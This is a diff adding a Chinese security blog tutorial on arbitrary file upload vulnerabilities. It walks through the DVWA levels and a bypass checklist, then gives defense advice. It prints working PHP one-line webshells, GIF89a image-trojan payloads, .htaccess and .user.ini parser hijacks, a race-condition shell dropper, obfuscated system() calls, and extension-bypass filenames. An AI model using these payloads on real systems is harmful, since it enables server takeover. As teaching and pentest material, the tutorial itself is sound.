@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>任意文件上传</title>
+<meta name="keywords" content="任意文件上传, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="
+一、概述1.1 是什么文件上传是 Web 应用的必备功能——头像上传、附件分享等。如果服务器配置不当或没有充分过滤，用户可以上传任意文件（恶意脚本、exe 程序等），这就是任意文件上传漏洞。通过它获取的网站后门叫 WebShell。
+1.">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="任意文件上传">
+<meta property="og:description" content="
+一、概述1.1 是什么文件上传是 Web 应用的必备功能——头像上传、附件分享等。如果服务器配置不当或没有充分过滤，用户可以上传任意文件（恶意脚本、exe 程序等），这就是任意文件上传漏洞。通过它获取的网站后门叫 WebShell。
+1.">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">任意文件上传</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2026-06-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/WEB%E6%B8%97%E9%80%8F/">
+              WEB渗透
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+              基础漏洞
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <hr>
+<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-1-是什么"><a href="#1-1-是什么" class="headerlink" title="1.1 是什么"></a>1.1 是什么</h3><p>文件上传是 Web 应用的必备功能——头像上传、附件分享等。如果服务器配置不当或没有充分过滤，用户可以上传任意文件（恶意脚本、exe 程序等），这就是<strong>任意文件上传漏洞</strong>。通过它获取的网站后门叫 <strong>WebShell</strong>。</p>
+<h3 id="1-2-漏洞成因"><a href="#1-2-漏洞成因" class="headerlink" title="1.2 漏洞成因"></a>1.2 漏洞成因</h3><ul>
+<li>服务器开启了 PUT 方法</li>
+<li>Web 开放了上传功能但没充分限制</li>
+<li>开发部署时未考虑：代码特性、组件漏洞、Web 容器漏洞、系统特性</li>
+</ul>
+<h3 id="1-3-挖掘思路"><a href="#1-3-挖掘思路" class="headerlink" title="1.3 挖掘思路"></a>1.3 挖掘思路</h3><p><strong>黑盒</strong>——找一切存在上传的地方：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 个人用户中心有没有上传功能</span><br><span class="line">2. 后台管理系统有没有上传功能</span><br><span class="line">3. 字典扫描探针文件上传地址</span><br><span class="line">4. 扫描编辑器目录构造上传地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>白盒</strong>——看三点：中间件、编辑器、功能代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 中间件：看语言环境常见搭配</span><br><span class="line">2. 编辑器：看目录结构或搜索关键字</span><br><span class="line">3. 功能代码：看源码应用或搜索关键字</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、DVWA-攻防递进"><a href="#二、DVWA-攻防递进" class="headerlink" title="二、DVWA 攻防递进"></a>二、DVWA 攻防递进</h2><h3 id="3-1-Low-—-无检测"><a href="#3-1-Low-—-无检测" class="headerlink" title="3.1 Low — 无检测"></a>3.1 Low — 无检测</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>);</span><br></pre></td></tr></table></figure>
+
+<p>无任何过滤。直接上传 <code>&lt;?php @eval($_REQUEST[6868])?&gt;</code> → 蚁剑连接。</p>
+<p><a class="simple-lightbox" href="/imgs/file-upload/image-20230829194422773.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/image-20230829194422773.png"  alt="蚁剑连接" lazyload></a></p>
+<p><a class="simple-lightbox" href="/imgs/file-upload/image-20230829194455612.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/image-20230829194455612.png"  alt="目录管理" lazyload></a></p>
+<h3 id="3-2-Medium-—-Content-Type-检测"><a href="#3-2-Medium-—-Content-Type-检测" class="headerlink" title="3.2 Medium — Content-Type 检测"></a>3.2 Medium — Content-Type 检测</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
+
+<p>只校验 Content-Type 和白名单尺寸。</p>
+<p><strong>绕过：</strong> Burp 抓包 → 改 <code>Content-Type: image/png</code></p>
+<p><a class="simple-lightbox" href="/imgs/file-upload/image-20230829194726519.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/image-20230829194726519.png"  alt="Content-Type 绕过" lazyload></a></p>
+<h3 id="3-3-High-—-后缀名-图片头"><a href="#3-3-High-—-后缀名-图片头" class="headerlink" title="3.3 High — 后缀名 + 图片头"></a>3.3 High — 后缀名 + 图片头</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uploaded_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploaded_ext</span>) == <span class="string">&quot;jpg&quot;</span> || ...) &amp;&amp;</span><br><span class="line">    (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>) &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$uploaded_tmp</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
+
+<p>三重检测：后缀名白名单 + 文件大小 + <code>getimagesize()</code> 读文件头。</p>
+<p><strong>绕过——文件内容开头加 <code>GIF89a</code>：</strong></p>
+<p><a class="simple-lightbox" href="/imgs/file-upload/image-20230829194823683.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/image-20230829194823683.png"  alt="High 绕过" lazyload></a></p>
+<p><strong>常见文件幻数：</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>十六进制头部</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPG</td>
+<td><code>FF D8 FF E0</code></td>
+</tr>
+<tr>
+<td>PNG</td>
+<td><code>89 50 4E 47</code></td>
+</tr>
+<tr>
+<td>GIF</td>
+<td><code>47 49 46 38</code></td>
+</tr>
+</tbody></table>
+<p><a class="simple-lightbox" href="/imgs/file-upload/image-20230829200521186.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/image-20230829200521186.png"  alt="文件幻数" lazyload></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump 1.jpg   <span class="comment"># 查看文件十六进制头部</span></span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/file-upload/image-20230829200926286.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/image-20230829200926286.png"  alt="hexdump" lazyload></a></p>
+<h3 id="3-4-图片木马"><a href="#3-4-图片木马" class="headerlink" title="3.4 图片木马"></a>3.4 图片木马</h3><p>图片马无法直接利用，需要配合文件包含或解析漏洞。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + 1.php/a 2.jpg</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/file-upload/image-20230829195714830.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/image-20230829195714830.png"  alt="CMD 合成" lazyload></a></p>
+<p><a class="simple-lightbox" href="/imgs/file-upload/image-20230829195758766.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/image-20230829195758766.png"  alt="上传成功" lazyload></a></p>
+<h3 id="3-5-Impossible-—-完全防御"><a href="#3-5-Impossible-—-完全防御" class="headerlink" title="3.5 Impossible — 完全防御"></a>3.5 Impossible — 完全防御</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">checkToken</span>();       <span class="comment">// 防 CSRF</span></span><br><span class="line"><span class="comment">// 随机重命名文件名</span></span><br><span class="line"><span class="variable">$target_file</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"><span class="comment">// 后缀名 + Content-Type + 文件头 三重检测</span></span><br><span class="line"><span class="comment">// 二次渲染（imagecreatefromjpeg + imagejpeg）过滤图片马中的代码</span></span><br><span class="line"><span class="comment">// 删除临时文件</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、黑白名单策略"><a href="#四、黑白名单策略" class="headerlink" title="四、黑白名单策略"></a>四、黑白名单策略</h2><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>文件后缀名</strong></td>
+<td>黑名单禁危险后缀 &#x2F; 白名单只放安全后缀</td>
+</tr>
+<tr>
+<td><strong>文件类型</strong></td>
+<td>Content-Type 校验</td>
+</tr>
+<tr>
+<td><strong>文件内容</strong></td>
+<td>读 Magic Bytes 验证真实类型</td>
+</tr>
+</tbody></table>
+<p><strong>后缀名黑名单：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jhtml&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><strong>后缀名白名单：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_ext</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;tar.gz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;doc&#x27;</span>,<span class="string">&#x27;docx&#x27;</span>,<span class="string">&#x27;pdf&#x27;</span>,<span class="string">&#x27;xls&#x27;</span>,<span class="string">&#x27;ppt&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、绕过手法大全"><a href="#五、绕过手法大全" class="headerlink" title="五、绕过手法大全"></a>五、绕过手法大全</h2><blockquote>
+<p>遇到文件上传，按这个顺序试。</p>
+</blockquote>
+<h3 id="5-1-前端-JS-校验-→-直接绕过"><a href="#5-1-前端-JS-校验-→-直接绕过" class="headerlink" title="5.1 前端 JS 校验 → 直接绕过"></a>5.1 前端 JS 校验 → 直接绕过</h3><p>前端用 JS 校验后缀名是最弱的防护：</p>
+<ul>
+<li>浏览器禁用 JavaScript 直接上传</li>
+<li>Burp 抓包，先上传合法后缀（如 <code>shell.jpg</code>），拦截后改为 <code>shell.php</code></li>
+</ul>
+<h3 id="5-2-Content-Type-→-改头"><a href="#5-2-Content-Type-→-改头" class="headerlink" title="5.2 Content-Type → 改头"></a>5.2 Content-Type → 改头</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream  → 改为 →  Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-黑名单后缀-→-换一个"><a href="#5-3-黑名单后缀-→-换一个" class="headerlink" title="5.3 黑名单后缀 → 换一个"></a>5.3 黑名单后缀 → 换一个</h3><p>PHP 可解析的后缀不止 <code>.php</code>。如果黑名单只拦了 <code>.php</code> 没拦全：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.php3  .php4  .php5  .phtml  .pht  .phps  .phar  .inc</span><br><span class="line">.asp  .asa  .cer  .cdx  .aspx  .ashx  .asmx  .ascx</span><br></pre></td></tr></table></figure>
+
+<p><strong>大小写混合（Windows）：</strong> <code>.Php</code> <code>.pHp</code> <code>.PHp5</code> — NTFS 不区分大小写。</p>
+<p><strong>双写绕过：</strong> <code>shell.pphphp</code> → 过滤掉中间的 <code>php</code> → <code>shell.php</code>。</p>
+<p><strong>末尾加特殊字符（Windows）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>手法</th>
+<th>文件名</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>末尾加空格</td>
+<td><code>shell.php </code></td>
+<td>Windows 自动去掉空格 → <code>.php</code></td>
+</tr>
+<tr>
+<td>末尾加点</td>
+<td><code>shell.php.</code></td>
+<td>Windows 自动去掉末尾点</td>
+</tr>
+<tr>
+<td><code>::$DATA</code></td>
+<td><code>shell.php::$DATA</code></td>
+<td>NTFS 流，自动截断</td>
+</tr>
+<tr>
+<td>点空格点</td>
+<td><code>shell.php. .</code></td>
+<td><code>deldot()</code> 缺陷被绕过</td>
+</tr>
+</tbody></table>
+<h3 id="5-4-白名单-→-00-截断（PHP-5-3-4）"><a href="#5-4-白名单-→-00-截断（PHP-5-3-4）" class="headerlink" title="5.4 白名单 → %00 截断（PHP &lt; 5.3.4）"></a>5.4 白名单 → %00 截断（PHP &lt; 5.3.4）</h3><p>白名单只允许 <code>.jpg</code> <code>.png</code> <code>.gif</code>，但路径拼接处可控：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filepath=shell.php%00.jpg</span><br><span class="line"># C 底层遇 0x00 截断 → 存为 shell.php</span><br><span class="line"># POST 方式在 Burp 的 Hex 编辑器中将 . 改为 00</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PHP 5.3.4 以上无效，<code>magic_quotes_gpc=Off</code> 才能用。</p>
+</blockquote>
+<h3 id="5-5-文件头检测-→-图片马"><a href="#5-5-文件头检测-→-图片马" class="headerlink" title="5.5 文件头检测 → 图片马"></a>5.5 文件头检测 → 图片马</h3><p>服务端用 <code>getimagesize()</code> 或读 Magic Bytes 验证，在木马前加合法文件头：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + shell.php/a 2.jpg    <span class="comment"># 合成图片马</span></span><br></pre></td></tr></table></figure>
+
+<p>图片马无法单独利用，需配合包含漏洞或解析漏洞触发。</p>
+<h3 id="5-6-文件内容关键字过滤-→-换写法"><a href="#5-6-文件内容关键字过滤-→-换写法" class="headerlink" title="5.6 文件内容关键字过滤 → 换写法"></a>5.6 文件内容关键字过滤 → 换写法</h3><p>有些 WAF &#x2F; 服务端不仅看后缀，还会扫文件内容有没有 <code>&lt;?</code> 或 <code>php</code> 关键字。</p>
+<p><strong>绕过 <code>&lt;?</code> 检测（PHP5）：</strong></p>
+<p>用 <code>&lt;script&gt;</code> 标签替代 <code>&lt;?php</code> 标签，只适用 PHP5：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[z]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过 <code>php</code> 关键字检测（PHP7）：</strong></p>
+<p>用短标签 <code>&lt;?=</code> ，避免出现 <code>php</code> 字眼：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[z]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;?=</code> 等价于 <code>&lt;?php echo</code>，PHP7 默认开启，不需要修改 <code>short_open_tag</code>。</p>
+<h3 id="5-7-htaccess（Apache）"><a href="#5-7-htaccess（Apache）" class="headerlink" title="5.7 .htaccess（Apache）"></a>5.7 .htaccess（Apache）</h3><p>上传 <code>.htaccess</code>，让 <code>.jpg</code> 被解析为 PHP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>前提：<code>AllowOverride All</code>，Apache 环境。</p>
+<p><a class="simple-lightbox" href="/imgs/file-upload/Pasted%20image%2020260626214644.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/Pasted%20image%2020260626214644.png"  alt=".htaccess 绕过1" lazyload></a><br><a class="simple-lightbox" href="/imgs/file-upload/Pasted%20image%2020260626214601.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/Pasted%20image%2020260626214601.png"  alt=".htaccess 绕过2" lazyload></a><br><a class="simple-lightbox" href="/imgs/file-upload/Pasted%20image%2020260626214607.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/Pasted%20image%2020260626214607.png"  alt=".htaccess 绕过3" lazyload></a></p>
+<h3 id="5-8-user-ini（Nginx-IIS）"><a href="#5-8-user-ini（Nginx-IIS）" class="headerlink" title="5.8 .user.ini（Nginx &#x2F; IIS）"></a>5.8 .user.ini（Nginx &#x2F; IIS）</h3><p><code>.user.ini</code> 是 PHP 的 per-directory 配置文件，比 <code>.htaccess</code> 适用范围更广——Nginx、Apache、IIS 均可用：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span> = shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>上传 <code>.user.ini</code> + 图片马 <code>shell.jpg</code> → 访问同目录下任意 PHP 文件 → <code>shell.jpg</code> 作为 PHP 自动执行。</p>
+<h3 id="5-9-条件竞争"><a href="#5-9-条件竞争" class="headerlink" title="5.9 条件竞争"></a>5.9 条件竞争</h3><p>文件上传后在被删除&#x2F;重命名前有一个极短的存活窗口，高频请求可在这个窗口里执行它：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传这个文件 → Burp Intruder 同时高并发访问它的 URL → 抢在被删前触发写入。</p>
+<h3 id="5-10-二次渲染绕过"><a href="#5-10-二次渲染绕过" class="headerlink" title="5.10 二次渲染绕过"></a>5.10 二次渲染绕过</h3><p>GD 库对上传图片做 <code>imagecreatefromjpeg()</code> + <code>imagejpeg()</code> 二次渲染会丢掉图片马的 PHP 代码。绕过思路：</p>
+<ul>
+<li>找到渲染后不会被修改的图片字节区域</li>
+<li>把 PHP 代码写入该区域</li>
+<li>或者用 <code>.htaccess</code> &#x2F; <code>.user.ini</code> 做解析跳板</li>
+</ul>
+<p><strong>免杀变种：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;<span class="variable">$a</span>(<span class="string">&#x27;tac ../flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;m&#x27;</span>;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="string">&#x27;tac ../flagaa.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、中间件解析漏洞"><a href="#六、中间件解析漏洞" class="headerlink" title="六、中间件解析漏洞"></a>六、中间件解析漏洞</h2><table>
+<thead>
+<tr>
+<th>中间件</th>
+<th>漏洞</th>
+<th>要点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IIS 6.0</td>
+<td><a target="_blank" rel="noopener" href="https://blog.csdn.net/longlangci/article/details/124716254">文件解析漏洞</a></td>
+<td>目录名 <code>.asp</code> → 目录下文件当 ASP 解析</td>
+</tr>
+<tr>
+<td>IIS 7.0&#x2F;7.5</td>
+<td><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IIS/IIS_7.o7.5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.md">IIS_7.o7.5解析漏洞</a></td>
+<td><code>cgi.fix_pathinfo</code> 配置问题</td>
+</tr>
+<tr>
+<td>Apache</td>
+<td><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache/Apache_HTTPD_%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E(CVE-2017-15715).md">Apache_HTTPD_换行解析漏洞(CVE-2017-15715)</a></td>
+<td>2.4.0~2.4.29，文件名加 <code>%0a</code> 绕过</td>
+</tr>
+<tr>
+<td>Apache</td>
+<td><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache/Apache_HTTPD_%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.md">Apache_HTTPD_多后缀解析漏洞</a></td>
+<td><code>xxx.php.jpg</code> 仍当 PHP 解析</td>
+</tr>
+<tr>
+<td>Apache</td>
+<td><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53696027/article/details/129244190">.htaccess 配置</a></td>
+<td><code>AddHandler application/x-httpd-php .php</code></td>
+</tr>
+<tr>
+<td>Nginx</td>
+<td><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx/Nginx_(%E8%83%8C%E9%94%85)%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md">Nginx_(背锅)解析漏洞复现</a></td>
+<td><code>cgi.fix_pathinfo=1</code> → <code>/xx.jpg/xx.php</code> 解析为 PHP</td>
+</tr>
+<tr>
+<td>Nginx</td>
+<td><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx/Nginx_%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E(CVE-2013-4547).md">Nginx_文件名逻辑漏洞(CVE-2013-4547)</a></td>
+<td>0.8.41~1.4.3，<code>1.gif[空格].php</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、防御"><a href="#七、防御" class="headerlink" title="七、防御"></a>七、防御</h2><p><strong>代码层面：</strong></p>
+<ul>
+<li>白名单策略，严格限制上传后缀名</li>
+<li>文件重命名，尽量少从客户端取值</li>
+<li>文件内容头部检测 + 二次渲染过滤图片马</li>
+<li>避免文件包含漏洞</li>
+<li>严格处理路径，防御 <code>%00</code> 截断</li>
